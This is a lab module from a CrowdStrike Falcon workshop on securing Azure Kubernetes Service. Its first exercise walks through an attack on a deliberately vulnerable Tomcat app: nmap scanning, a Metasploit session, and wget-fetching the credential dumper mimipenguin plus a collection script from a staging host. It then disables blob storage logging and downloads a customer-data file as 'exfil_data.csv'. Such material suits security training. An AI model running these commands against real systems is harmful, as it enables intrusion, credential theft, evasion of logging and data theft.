---
Title: 10b - Protect Azure Kubernetes Service (AKS) Workloads
Description: CrowdStrike Falcon Compute provides a comprehensive set of security capabilities to protect containerized workloads everywhere including AKS
Author: David Okeyode
---

## Module 10 - Introduction - Protect Azure Kubernetes Service (AKS) Workloads
In this module, we will begin to walk through the process of installing the CrowdStrike Falcon sensor/agents to protect workloads in an AKS cluster. Here are the exercises that we will complete:

> * Connect to the Linux VM and establish connection to the AKS cluster
> * Install the Falcon Sensor to AKS
> * Install the Falcon KAC (Kubernetes Admissions Controller)
> * Install the Falcon KPA (Kubernetes Protection Agent)
> * Install the Falcon IAR (Image Assessment at Runtime)
> * Troubleshooting AKS Sensor/Agent Deployments
> * Prevent untrusted images from being deployed to AKS

## Exercise 1 - Deploy Sample Vulnerable App to AKS

```
mkdir k8s-deployments
cd k8s-deployments

curl -o tomcat-webshell.yaml https://raw.githubusercontent.com/davidokeyode/crowdstrike-workshop-labs/refs/heads/main/workshops/azure-cloud-protection/templates/tomcat-webshell.yaml

kubectl apply -f tomcat-webshell.yaml
```


1. Launch nmap with the parameters pointing to the IP address of the target system. This will also show the names of the service that might be running and let us know if there is a vulnerability that we can exploit.
* After the scan is complete, We can see that there's an http service running Apache Tomcat/Coyote JSP engine 1.1.

```
nmap -R -Pn -p30007 -sV 172.17.0.33
```


2. Metasploit is a Penetration Testing Framework that provides information about security vulnerabilities. Launch Metasploit with a script that has all the necessary parameters (e.g. ip address, exploit to use, etc) for the target already pre-populated and gain control of the container.

```
msfconsole -q -r startup.rc
```

> * We can see that session 1 has been opened.

3. Connect to the session: 
```
sessions -i 1
```

4. Now that we have full control of the system, we can continue our attack. We can now download our scripts with wget to perform post exploitation activity. The command also makes the new scripts executable with the chmod command.
* Mimipenguin is a free and open source, simple yet powerful Shell/Python script used to dump the login credentials (usernames and passwords) from the current Linux desktop user and it has been tested on various Linux distributions.
```
wget https://raw.githubusercontent.com/huntergregal/mimipenguin/refs/heads/master/mimipenguin.sh; wget http://172.17.0.21/collection.sh;chmod +x *.sh; ls -l *.sh
ls

wget https://raw.githubusercontent.com/davidokeyode/crowdstrike-workshop-labs/refs/heads/main/workshops/azure-cloud-protection/templates/mimipenguin.sh; wget https://raw.githubusercontent.com/davidokeyode/crowdstrike-workshop-labs/refs/heads/main/workshops/azure-cloud-protection/templates/collection.sh;chmod +x *.sh; ls -l *.sh
ls

https://raw.githubusercontent.com/davidokeyode/crowdstrike-workshop-labs/refs/heads/main/workshops/azure-cloud-protection/templates/mimipenguin.sh

https://raw.githubusercontent.com/davidokeyode/crowdstrike-workshop-labs/refs/heads/main/workshops/azure-cloud-protection/templates/collection.sh

wget http://172.17.0.21/mimipenguin.sh; wget http://172.17.0.21/collection.sh;chmod +x *.sh; ls -l *.sh
ls
```



5. Once the container is compromised, the attacker will move laterally and leverage the IAM role attached to the instance to disable logging on a specific S3 bucket.

a. List all the S3 buckets.
```
az storage account list --query "[?contains(name, 'azlab')].{Name:name}"

STORAGE_ACCOUNT_NAME=$(az storage account list --query "[?contains(name, 'azlab')].{Name:name}" -o tsv)

echo $STORAGE_ACCOUNT_NAME
```

b. Review the log settings for the blob storage.
az storage logging show --account-name $STORAGE_ACCOUNT_NAME --services b 

c. Disable logging for the blob storage.
az storage logging off --account-name $STORAGE_ACCOUNT_NAME --services b


** Enable logging for the blob storage
az storage logging update --account-name $STORAGE_ACCOUNT_NAME --services b --log rwd --retention 1



d. Finishing out the lateral movement with the actual point of the attack is to steal data. List content in the bucket.

az storage container list --account-name $STORAGE_ACCOUNT_NAME --query "[].name" -o tsv

CONTAINER=$(az storage container list --account-name $STORAGE_ACCOUNT_NAME --query "[].name" -o tsv)

az storage blob list --account-name $STORAGE_ACCOUNT_NAME --container-name $CONTAINER --query "[].name" -o tsv


e. Copy the content of the Confidential file into a new file called stolen-info.txt. Check if the file was downloaded.

az storage blob download --account-name $STORAGE_ACCOUNT_NAME --container-name $CONTAINER --name sensitive_customer_private_information.csv --file exfil_data.csv

ls

cat exfil_data.csv













## Exercise 6 - Deploy Sample App to AKS

1. **Open the Cloud Shell**

2. **If you have more than one Azure subscription, ensure you are in the right one that you deployed the lab resources into**
```
az account show
az account list -o table
az account set -s <subscription_name>
```

3. **Configure kubectl to connect to your Kubernetes cluster, use the `az aks get-credentials` command. `Kubectl` is pre-installed in the Azure cloud shell.** 
```
az aks get-credentials --resource-group azlab-rg --name azlab-aks
```

4. **To verify the connection to your cluster, run the `kubectl` get nodes command to return a list of the cluster nodes.**
```
kubectl get nodes
```

5. **Create namespace**
```
kubectl create namespace sock-shop
```

6. **Clone the `microservices-demo` repository**
```
git clone https://github.com/davidokeyode/microservices-demo.git
```

7. **Go to the `deploy/kubernetes` folder**
```
cd microservices-demo/deploy/kubernetes
```

8. **Review file**
```
code aks-complete-demo.yaml
```

9. **Deploy app**
```
kubectl apply -f aks-complete-demo.yaml
```

10. **Get public IP of front-end**
```
kubectl get services --selector=name=front-end -n sock-shop -o wide
kubectl get services -n sock-shop
```

11. **Browse to it**
```
http://<EXTERNAL-IP>
```